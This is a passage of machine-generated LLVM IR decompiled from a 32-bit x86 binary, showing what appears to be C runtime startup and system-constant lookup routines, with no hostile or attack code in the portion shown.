    i32 25, label %dec_label_pc_8052083
    i32 26, label %dec_label_pc_8052054
    i32 27, label %dec_label_pc_8052077
    i32 28, label %dec_label_pc_8051fca
    i32 29, label %dec_label_pc_805204d
    i32 30, label %dec_label_pc_8051fc2
    i32 31, label %dec_label_pc_8052062
    i32 32, label %dec_label_pc_8052077
    i32 33, label %dec_label_pc_8052077
    i32 34, label %dec_label_pc_8052077
    i32 35, label %dec_label_pc_805205b
    i32 36, label %dec_label_pc_805208a
    i32 37, label %dec_label_pc_8052091
    i32 38, label %dec_label_pc_805208a
    i32 39, label %dec_label_pc_8051fd4
    i32 40, label %dec_label_pc_8052098
    i32 41, label %dec_label_pc_8052077
    i32 42, label %dec_label_pc_8052062
    i32 43, label %dec_label_pc_8052091
    i32 44, label %dec_label_pc_805209f
    i32 45, label %dec_label_pc_8052091
    i32 46, label %dec_label_pc_805204d
    i32 47, label %dec_label_pc_805204d
    i32 48, label %dec_label_pc_805204d
    i32 49, label %dec_label_pc_8052077
    i32 50, label %dec_label_pc_8052077
    i32 51, label %dec_label_pc_805204d
    i32 52, label %dec_label_pc_805204d
    i32 53, label %dec_label_pc_8052077
    i32 54, label %dec_label_pc_8052077
    i32 55, label %dec_label_pc_8052077
    i32 56, label %dec_label_pc_8052077
    i32 57, label %dec_label_pc_8052077
    i32 58, label %dec_label_pc_8052077
    i32 59, label %dec_label_pc_8052077
    i32 60, label %dec_label_pc_8052077
    i32 61, label %dec_label_pc_8052077
    i32 62, label %dec_label_pc_8052077
    i32 63, label %dec_label_pc_8052077
    i32 64, label %dec_label_pc_8052077
    i32 65, label %dec_label_pc_8052077
    i32 66, label %dec_label_pc_8052077
    i32 67, label %dec_label_pc_8051f78
    i32 68, label %dec_label_pc_8051f78
    i32 69, label %dec_label_pc_805205b
    i32 70, label %dec_label_pc_805205b
    i32 71, label %dec_label_pc_805205b
    i32 72, label %dec_label_pc_8052062
    i32 73, label %dec_label_pc_8052069
    i32 74, label %dec_label_pc_8052070
    i32 75, label %dec_label_pc_8051fde
    i32 76, label %dec_label_pc_8052070
    i32 77, label %dec_label_pc_8051f78
    i32 78, label %dec_label_pc_8051f78
    i32 79, label %dec_label_pc_8051f78
    i32 80, label %dec_label_pc_8051f78
    i32 81, label %dec_label_pc_8051f78
    i32 82, label %dec_label_pc_8051f78
    i32 83, label %dec_label_pc_8051f78
    i32 84, label %dec_label_pc_8051f78
    i32 85, label %dec_label_pc_8052077
    i32 86, label %dec_label_pc_8052077
    i32 87, label %dec_label_pc_8052054
    i32 88, label %dec_label_pc_8051fe8
    i32 89, label %dec_label_pc_8051ff2
    i32 90, label %dec_label_pc_8052069
    i32 91, label %dec_label_pc_8051f78
    i32 92, label %dec_label_pc_8051f78
    i32 93, label %dec_label_pc_8051f78
    i32 94, label %dec_label_pc_8051f78
    i32 95, label %dec_label_pc_805204d
    i32 96, label %dec_label_pc_8052077
    i32 97, label %dec_label_pc_8052077
    i32 98, label %dec_label_pc_8051f78
    i32 99, label %dec_label_pc_8051f78
    i32 100, label %dec_label_pc_8051f78
    i32 101, label %dec_label_pc_8051ffc
    i32 102, label %dec_label_pc_805203f
    i32 103, label %dec_label_pc_805207c
    i32 104, label %dec_label_pc_8052054
    i32 105, label %dec_label_pc_8052006
    i32 106, label %dec_label_pc_8052062
    i32 107, label %dec_label_pc_8052062
    i32 108, label %dec_label_pc_8052046
    i32 109, label %dec_label_pc_8052083
    i32 110, label %dec_label_pc_805209f
    i32 111, label %dec_label_pc_805203f
    i32 112, label %dec_label_pc_805207c
    i32 113, label %dec_label_pc_805209f
    i32 114, label %dec_label_pc_8052010
    i32 115, label %dec_label_pc_8052098
    i32 116, label %dec_label_pc_8052077
    i32 117, label %dec_label_pc_8052077
    i32 118, label %dec_label_pc_805201a
    i32 119, label %dec_label_pc_8052024
    i32 120, label %dec_label_pc_8052091
    i32 121, label %dec_label_pc_8052054
    i32 122, label %dec_label_pc_8052054
    i32 123, label %dec_label_pc_8052054
    i32 124, label %dec_label_pc_8052054
    i32 125, label %dec_label_pc_8051f78
    i32 126, label %dec_label_pc_8051f78
    i32 127, label %dec_label_pc_8052077
    i32 128, label %dec_label_pc_8052077
    i32 129, label %dec_label_pc_8051f78
    i32 130, label %dec_label_pc_8051f78
    i32 131, label %dec_label_pc_8052077
    i32 149, label %dec_label_pc_805202b
  ]

dec_label_pc_8051f78:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8051f82:                             ; preds = %dec_label_pc_8051f63
  %v1_8051f82 = call i32 @function_805078b(i32 ptrtoint (i32* @0 to i32))
  %v1_8051f87 = inttoptr i32 %v1_8051f82 to i32*
  store i32 22, i32* %v1_8051f87, align 4
  br label %dec_label_pc_8052077

dec_label_pc_8051f92:                             ; preds = %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8051f9c:                             ; preds = %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8051fa6:                             ; preds = %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8051fb0:                             ; preds = %dec_label_pc_8051f63
  %v0_8051fb3 = call i32 @function_80526ad()
  br label %dec_label_pc_8051fb8

dec_label_pc_8051fb8:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051fb0
  br label %dec_label_pc_80520a4

dec_label_pc_8051fc2:                             ; preds = %dec_label_pc_8051f63
  %v0_8051fc5 = call i32 @function_8052744()
  br label %dec_label_pc_8051fca

dec_label_pc_8051fca:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051fc2
  br label %dec_label_pc_80520a4

dec_label_pc_8051fd4:                             ; preds = %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8051fde:                             ; preds = %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8051fe8:                             ; preds = %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8051ff2:                             ; preds = %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8051ffc:                             ; preds = %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8052006:                             ; preds = %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8052010:                             ; preds = %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_805201a:                             ; preds = %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8052024:                             ; preds = %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_805202b:                             ; preds = %dec_label_pc_8051f63
  %v5_8052031 = call i32 @function_80524b0(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8052039 = icmp slt i32 %v5_8052031, 0
  %v1_805203b = icmp eq i1 %v2_8052039, false
  br i1 %v1_805203b, label %dec_label_pc_805204d, label %dec_label_pc_8052077

dec_label_pc_805203f:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8052046:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_805204d:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_805202b
  br label %dec_label_pc_80520a4

dec_label_pc_8052054:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_805205b:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8052062:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8052069:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8052070:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8052077:                             ; preds = %dec_label_pc_805202b, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f82
  br label %dec_label_pc_80520a4

dec_label_pc_805207c:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8052083:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_805208a:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8052091:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_8052098:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_805209f:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f63, %dec_label_pc_8051f63
  br label %dec_label_pc_80520a4

dec_label_pc_80520a4:                             ; preds = %dec_label_pc_8052098, %dec_label_pc_8052091, %dec_label_pc_805208a, %dec_label_pc_8052083, %dec_label_pc_805207c, %dec_label_pc_8052070, %dec_label_pc_8052069, %dec_label_pc_8052062, %dec_label_pc_805205b, %dec_label_pc_8052054, %dec_label_pc_8052046, %dec_label_pc_805203f, %dec_label_pc_805204d, %dec_label_pc_8052024, %dec_label_pc_805201a, %dec_label_pc_8052010, %dec_label_pc_8052006, %dec_label_pc_8051ffc, %dec_label_pc_8051ff2, %dec_label_pc_8051fe8, %dec_label_pc_8051fde, %dec_label_pc_8051fd4, %dec_label_pc_8051fca, %dec_label_pc_8051fb8, %dec_label_pc_8051fa6, %dec_label_pc_8051f9c, %dec_label_pc_8051f92, %dec_label_pc_8051f78, %dec_label_pc_8052077, %dec_label_pc_805209f
  %v0_80520a7 = phi i32 [ 255, %dec_label_pc_8052098 ], [ 2048, %dec_label_pc_8052091 ], [ 99, %dec_label_pc_805208a ], [ 20, %dec_label_pc_8052083 ], [ -128, %dec_label_pc_805207c ], [ 1024, %dec_label_pc_8052070 ], [ 4, %dec_label_pc_8052069 ], [ 32, %dec_label_pc_8052062 ], [ 256, %dec_label_pc_805205b ], [ 2147483647, %dec_label_pc_8052054 ], [ 16, %dec_label_pc_8052046 ], [ 127, %dec_label_pc_805203f ], [ 200112, %dec_label_pc_805204d ], [ 9, %dec_label_pc_8052024 ], [ 65535, %dec_label_pc_805201a ], [ -32768, %dec_label_pc_8052010 ], [ -2147483648, %dec_label_pc_8052006 ], [ 8, %dec_label_pc_8051ffc ], [ 500, %dec_label_pc_8051ff2 ], [ 4096, %dec_label_pc_8051fe8 ], [ 16384, %dec_label_pc_8051fde ], [ 1000, %dec_label_pc_8051fd4 ], [ 32768, %dec_label_pc_8051fca ], [ 6, %dec_label_pc_8051fb8 ], [ 65536, %dec_label_pc_8051fa6 ], [ 100, %dec_label_pc_8051f9c ], [ 131072, %dec_label_pc_8051f92 ], [ 1, %dec_label_pc_8051f78 ], [ -1, %dec_label_pc_8052077 ], [ 32767, %dec_label_pc_805209f ]
  ret i32 %v0_80520a7

; uselistorder directives
  uselistorder i32 65536, { 28, 29, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 14, 12, 15, 17, 16, 18, 1, 19, 0, 2, 22, 20, 23, 21, 26, 24, 25, 27 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 24, 25, 22, 23, 16, 17, 20, 21, 18, 19, 1, 2, 3, 4, 14, 15, 26, 27, 28, 29, 12, 13 }
  uselistorder i32 65535, { 3, 0, 1, 2 }
  uselistorder i32 2048, { 3, 1, 4, 2, 0 }
  uselistorder i32 255, { 0, 2, 3, 4, 1 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 112, { 1, 0 }
  uselistorder i32 110, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 68, { 2, 0, 1 }
  uselistorder i32 63, { 1, 0, 2 }
  uselistorder i32 60, { 2, 0, 1 }
  uselistorder i32 58, { 1, 0 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 37, { 1, 0 }
  uselistorder i32 34, { 2, 0, 1 }
  uselistorder i32 27, { 3, 4, 5, 6, 7, 8, 2, 1, 0 }
  uselistorder i32 17, { 6, 4, 5, 2, 3, 1, 0, 7, 8 }
  uselistorder i32 9, { 2, 4, 0, 1, 3, 6, 11, 7, 8, 9, 10, 5, 12 }
  uselistorder i32 6, { 0, 5, 2, 3, 1, 7, 4, 11, 8, 9, 10, 6 }
  uselistorder i32 5, { 5, 0, 7, 8, 13, 10, 11, 12, 6, 4, 3, 1, 2, 9 }
  uselistorder label %dec_label_pc_80520a4, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8052077, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_805204d, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051fca, { 1, 0 }
  uselistorder label %dec_label_pc_8051fb8, { 1, 0 }
}

define i32 @function_80520a8() local_unnamed_addr {
dec_label_pc_80520a8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80520a8 = load i32, i32* @ebx, align 4
  store i32 %v0_80520a8, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80542c4.58 to i32), i32 -134562500), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80542c4.58 to i32), i32 -134562500), i32 2), i32 0), label %dec_label_pc_80520bc, label %dec_label_pc_80520c9

dec_label_pc_80520bc:                             ; preds = %dec_label_pc_80520a8, %dec_label_pc_80520bc
  %v1_80520c36 = phi i32 [ %v1_80520c3, %dec_label_pc_80520bc ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80542c4.58 to i32), i32 -134562500), i32 2), i32 -1), %dec_label_pc_80520a8 ]
  store i32 ptrtoint (i32* @global_var_80520c3.59 to i32), i32* %stack_var_-16, align 4
  %v5_80520bc = mul i32 %v1_80520c36, 4
  %v6_80520bc = add i32 %v5_80520bc, ptrtoint (i32* @global_var_80542c4.58 to i32)
  %v7_80520bc = inttoptr i32 %v6_80520bc to i32*
  %v8_80520bc = load i32, i32* %v7_80520bc, align 4
  call void @__pseudo_call(i32 %v8_80520bc)
  %v0_80520c3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520c3 = add i32 %v0_80520c3.pre, -1
  store i32 %v1_80520c3, i32* %ebx.global-to-local, align 4
  %v10_80520c4 = icmp eq i32 %v0_80520c3.pre, 0
  %v1_80520c7 = icmp eq i1 %v10_80520c4, false
  br i1 %v1_80520c7, label %dec_label_pc_80520bc, label %dec_label_pc_80520c9

dec_label_pc_80520c9:                             ; preds = %dec_label_pc_80520bc, %dec_label_pc_80520a8
  %v0_80520c9 = load i32, i32* @global_var_8054408.60, align 8
  %v1_80520ce = icmp eq i32 %v0_80520c9, 0
  br i1 %v1_80520ce, label %dec_label_pc_80520d4, label %dec_label_pc_80520d2

dec_label_pc_80520d2:                             ; preds = %dec_label_pc_80520c9
  %v0_80520d2 = load i32, i32* %stack_var_-16, align 4
  %v1_80520d2 = call i32 @unknown_0(i32 %v0_80520d2)
  br label %dec_label_pc_80520d4

dec_label_pc_80520d4:                             ; preds = %dec_label_pc_80520d2, %dec_label_pc_80520c9
  %v0_80520d4 = load i32, i32* @global_var_805440c.61, align 4
  store i32 %v0_80520d4, i32* @ecx, align 4
  %v1_80520da = icmp eq i32 %v0_80520d4, 0
  br i1 %v1_80520da, label %dec_label_pc_80520e3, label %dec_label_pc_80520de

dec_label_pc_80520de:                             ; preds = %dec_label_pc_80520d4
  %v2_80520e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80520e0, i32* %ebx.global-to-local, align 4
  %v0_80520e1 = load i32, i32* %stack_var_-16, align 4
  %v1_80520e1 = call i32 @unknown_0(i32 %v0_80520e1)
  br label %dec_label_pc_80520e3

dec_label_pc_80520e3:                             ; preds = %dec_label_pc_80520d4, %dec_label_pc_80520de
  %v2_80520e3 = load i32, i32* %stack_var_-16, align 4
  %v2_80520e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80520e4, i32* @edx, align 4
  ret i32 %v2_80520e3

; uselistorder directives
  uselistorder i32 %v1_80520c3, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80520e3, { 1, 0 }
  uselistorder label %dec_label_pc_80520bc, { 1, 0 }
}

define i32 @function_80520e7(i32 %arg1) local_unnamed_addr {
dec_label_pc_80520e7:
  ret i32 0
}

define i32 @function_80520ea(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80520ea:
  %v0_80520ea = load i32, i32* @eax, align 4
  ret i32 %v0_80520ea
}

define i32 @function_80520eb() local_unnamed_addr {
dec_label_pc_80520eb:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_80520eb = load i32, i32* @esi, align 4
  %v0_80520ec = load i32, i32* @ebx, align 4
  %v0_80520f0 = load i32, i32* @eax, align 4
  store i32 %v0_80520f0, i32* @esi, align 4
  %v0_80520f2 = load i32, i32* @edx, align 4
  store i32 %v0_80520f2, i32* @ebx, align 4
  %v4_80520f7 = call i32 @function_80501bd(i32 %v0_80520f0, i32 1, i32 %tmp6)
  %v8_80520ff = icmp eq i32 %v4_80520f7, -1
  %v1_8052100 = icmp eq i1 %v8_80520ff, false
  br i1 %v1_8052100, label %dec_label_pc_805211b, label %dec_label_pc_8052102

dec_label_pc_8052102:                             ; preds = %dec_label_pc_80520eb
  %v0_8052104 = load i32, i32* @ebx, align 4
  %v6_805210a = call i32 @function_8050364(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8052fb0.62, i32 0, i32 0), i32 %v0_8052104)
  %v1_8052112 = load i32, i32* @esi, align 4
  %v12_8052112 = icmp eq i32 %v6_805210a, %v1_8052112
  br i1 %v12_8052112, label %dec_label_pc_805211b, label %dec_label_pc_8052116

dec_label_pc_8052116:                             ; preds = %dec_label_pc_8052102
  %v0_8052116 = call i32 @function_8051b1f()
  br label %dec_label_pc_805211b

dec_label_pc_805211b:                             ; preds = %dec_label_pc_8052102, %dec_label_pc_80520eb, %dec_label_pc_8052116
  %v2_805211b = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80520ec, i32* @ebx, align 4
  store i32 %v0_80520eb, i32* @esi, align 4
  ret i32 %v2_805211b

; uselistorder directives
  uselistorder i32 ()* @function_8051b1f, { 0, 4, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @function_8050364, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_80501bd, { 0, 5, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_805211b, { 2, 0, 1 }
}

define i32 @function_805211f() local_unnamed_addr {
dec_label_pc_805211f:
  %v0_8052122 = load i8, i8* @global_var_8054410.63, align 16
  %v1_8052122 = icmp eq i8 %v0_8052122, 0
  %v1_8052129 = icmp eq i1 %v1_8052122, false
  br i1 %v1_8052129, label %dec_label_pc_805211f.dec_label_pc_805215b_crit_edge, label %dec_label_pc_805212b

dec_label_pc_805211f.dec_label_pc_805215b_crit_edge: ; preds = %dec_label_pc_805211f
  %v0_805215e.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805215b

dec_label_pc_805212b:                             ; preds = %dec_label_pc_805211f
  store i8 1, i8* @global_var_8054410.63, align 16
  store i32 4096, i32* @global_var_8054404.64, align 4
  br label %dec_label_pc_805215b

dec_label_pc_805215b:                             ; preds = %dec_label_pc_805211f.dec_label_pc_805215b_crit_edge, %dec_label_pc_805212b
  %v0_805215e = phi i32 [ %v0_805215e.pre, %dec_label_pc_805211f.dec_label_pc_805215b_crit_edge ], [ 0, %dec_label_pc_805212b ]
  ret i32 %v0_805215e

; uselistorder directives
  uselistorder i8 1, { 8, 1, 7, 0, 4, 5, 2, 3, 6 }
  uselistorder i8* @global_var_8054410.63, { 1, 0 }
  uselistorder label %dec_label_pc_805215b, { 1, 0 }
}

define i32 @function_805215f(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_805215f:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80543fc.65, align 4
  store i32 %arg6, i32* @global_var_805440c.61, align 4
  %v2_8052196 = mul i32 %arg2, 4
  %v3_8052196 = add i32 %tmp44, %v2_8052196
  %v1_8052199 = add i32 %v3_8052196, 4
  store i32 %v1_8052199, i32* @global_var_8054400.66, align 1024
  %v3_80521a1 = load i32, i32* %arg3, align 4
  %v14_80521a1 = icmp eq i32 %v1_8052199, %v3_80521a1
  %v1_80521a3 = icmp eq i1 %v14_80521a1, false
  %v1_8052199.v3_8052196 = select i1 %v1_80521a3, i32 %v1_8052199, i32 %v3_8052196
  store i32 %v1_8052199.v3_8052196, i32* @global_var_8054400.66, align 1024
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_80521b0 = ptrtoint i32* %stack_var_-136 to i32
  %v3_80521b5 = bitcast i32* %stack_var_-136 to i8*
  %v4_80521b5 = call i32 @function_80507dc(i8* %v3_80521b5, i32 0, i32 120)
  %v0_80521ba = load i32, i32* @global_var_8054400.66, align 1024
  br label %dec_label_pc_80521c2

dec_label_pc_80521c2:                             ; preds = %dec_label_pc_80521c2, %dec_label_pc_805215f
  %v0_80521c2 = phi i32 [ %v1_80521c5, %dec_label_pc_80521c2 ], [ %v0_80521ba, %dec_label_pc_805215f ]
  %v1_80521c2 = inttoptr i32 %v0_80521c2 to i32*
  %v2_80521c2 = load i32, i32* %v1_80521c2, align 4
  %v3_80521c2 = icmp eq i32 %v2_80521c2, 0
  %v1_80521c5 = add i32 %v0_80521c2, 4
  %v1_80521c8 = icmp eq i1 %v3_80521c2, false
  br i1 %v1_80521c8, label %dec_label_pc_80521c2, label %dec_label_pc_80521e9.preheader

dec_label_pc_80521e9.preheader:                   ; preds = %dec_label_pc_80521c2
  store i32 %v1_80521c5, i32* @ebx, align 4
  %v1_80521e922 = inttoptr i32 %v1_80521c5 to i32*
  %v2_80521e923 = load i32, i32* %v1_80521e922, align 4
  %v3_80521e924 = icmp eq i32 %v2_80521e923, 0
  %v1_80521ec26 = icmp eq i1 %v3_80521e924, false
  br i1 %v1_80521ec26, label %dec_label_pc_80521ce.lr.ph, label %dec_label_pc_80521ee

dec_label_pc_80521ce.lr.ph:                       ; preds = %dec_label_pc_80521e9.preheader
  %v3_80521ae = ptrtoint i32* %stack_var_-168 to i32
  %v3_80521d9 = add i32 %v3_80521ae, 32
  br label %dec_label_pc_80521ce

dec_label_pc_80521ce:                             ; preds = %dec_label_pc_80521ce.lr.ph, %dec_label_pc_80521e6
  %v1_80521d9 = phi i32 [ %v2_80521e923, %dec_label_pc_80521ce.lr.ph ], [ %v2_80521e9, %dec_label_pc_80521e6 ]
  %v0_80521d8 = phi i32 [ %v1_80521c5, %dec_label_pc_80521ce.lr.ph ], [ %v1_80521e6, %dec_label_pc_80521e6 ]
  %v6_80521d3 = icmp ugt i32 %v1_80521d9, 14
  br i1 %v6_80521d3, label %dec_label_pc_80521e6, label %dec_label_pc_80521d5

dec_label_pc_80521d5:                             ; preds = %dec_label_pc_80521ce
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_80521d8, i32* %stack_var_-168, align 4
  %v2_80521d9 = mul i32 %v1_80521d9, 8
  %v4_80521d9 = add i32 %v3_80521d9, %v2_80521d9
  %v3_80521de = inttoptr i32 %v4_80521d9 to i16*
  %v4_80521de = call i32 @function_80529aa(i16* %v3_80521de, i32 %v0_80521d8, i32 8)
  %v0_80521e6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80521e6

dec_label_pc_80521e6:                             ; preds = %dec_label_pc_80521ce, %dec_label_pc_80521d5
  %v0_80521e6 = phi i32 [ %v0_80521d8, %dec_label_pc_80521ce ], [ %v0_80521e6.pre, %dec_label_pc_80521d5 ]
  %v1_80521e6 = add i32 %v0_80521e6, 8
  store i32 %v1_80521e6, i32* @ebx, align 4
  %v1_80521e9 = inttoptr i32 %v1_80521e6 to i32*
  %v2_80521e9 = load i32, i32* %v1_80521e9, align 4
  %v3_80521e9 = icmp eq i32 %v2_80521e9, 0
  %v1_80521ec = icmp eq i1 %v3_80521e9, false
  br i1 %v1_80521ec, label %dec_label_pc_80521ce, label %dec_label_pc_80521ee

dec_label_pc_80521ee:                             ; preds = %dec_label_pc_80521e6, %dec_label_pc_80521e9.preheader
  store i32 %v2_80521b0, i32* @eax, align 4
  %v0_80521f2 = call i32 @function_8052a7d()
  store i32 %v0_80521f2, i32* @eax, align 4
  %v0_80521f7 = call i32 @function_805211f()
  %v1_8052200 = icmp eq i32 %tmp39, 0
  %v1_8052202 = icmp eq i1 %v1_8052200, false
  %v1_8052204 = and i32 %tmp39, -65536
  %v2_8052204 = or i32 %v1_8052204, 4096
  %storemerge = select i1 %v1_8052202, i32 %tmp39, i32 %v2_8052204
  store i32 %storemerge, i32* @global_var_8054404.64, align 4
  %v13_805220d = icmp eq i32 %tmp38, -1
  %v1_8052212 = icmp eq i1 %v13_805220d, false
  br i1 %v1_8052212, label %dec_label_pc_805223d, label %dec_label_pc_8052214

dec_label_pc_8052214:                             ; preds = %dec_label_pc_80521ee
  %v0_8052214 = call i32 @function_8052789()
  store i32 %v0_8052214, i32* @ebx, align 4
  %v0_805221b = call i32 @function_80526f8()
  %v0_8052220 = load i32, i32* @ebx, align 4
  %v12_8052220 = icmp eq i32 %v0_8052220, %v0_805221b
  %v1_8052222 = icmp eq i1 %v12_8052220, false
  br i1 %v1_8052222, label %dec_label_pc_8052253, label %dec_label_pc_8052224

dec_label_pc_8052224:                             ; preds = %dec_label_pc_8052214
  %v0_8052224 = call i32 @function_805271e()
  store i32 %v0_8052224, i32* @ebx, align 4
  %v0_805222b = call i32 @function_80526d2()
  %v0_8052230 = load i32, i32* @ebx, align 4
